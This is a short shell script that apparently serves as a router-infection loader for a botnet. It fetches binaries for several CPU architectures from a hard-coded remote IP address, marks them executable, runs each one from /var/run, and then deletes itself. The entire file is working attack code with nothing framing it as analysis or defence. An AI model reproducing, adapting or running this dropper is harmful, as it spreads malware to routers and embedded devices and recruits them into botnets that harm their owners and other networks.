﻿#!/bin/sh
# THIS SCRIPT DOWNLOAD THE BINARIES INTO ROUTER.
# UPLOAD GETBINARIES.SH IN YOUR HTTPD.

# YOUR HTTPD SERVER:
REFERENCE_HTTP="http://192.99.151.119"

# NAME OF BINARIES:
REFERENCE_MIPSEL="m.i.psel"
REFERENCE_MIPS="m.i.ps"
REFERENCE_SUPERH="s...h"
REFERENCE_ARM="a.r.m"
REFERENCE_PPC="p.p.c"
REFERENCE_x86="x86_64"

rm -fr /var/run/${REFERENCE_MIPSEL} \
	/var/run/${REFERENCE_MIPS} \
	/var/run/${REFERENCE_SUPERH} \
	/var/run/${REFERENCE_ARM} \
	/var/run/${REFERENCE_PPC} \
	/var/run/${REFERENCE_x86}

wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPSEL} -P /var/run && chmod +x /var/run/${REFERENCE_MIPSEL} && /var/run/${REFERENCE_MIPSEL}
wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPS} -P /var/run && chmod +x /var/run/${REFERENCE_MIPS} && /var/run/${REFERENCE_MIPS}
wget -c ${REFERENCE_HTTP}/${REFERENCE_ARM} -P /var/run && chmod +x /var/run/${REFERENCE_ARM} && /var/run/${REFERENCE_ARM}
wget -c ${REFERENCE_HTTP}/${REFERENCE_PPC} -P /var/run && chmod +x /var/run/${REFERENCE_PPC} && /var/run/${REFERENCE_PPC}
wget -c ${REFERENCE_HTTP}/${REFERENCE_SUPERH} -P /var/run && chmod +x /var/run/${REFERENCE_SUPERH} && /var/run/${REFERENCE_SUPERH}
wget -c ${REFERENCE_HTTP}/${REFERENCE_x86} -P /var/run && chmod +x /var/run/${REFERENCE_x86} && /var/run/${REFERENCE_x86}

sleep 3;
rm -fr /var/run/getbinaries.sh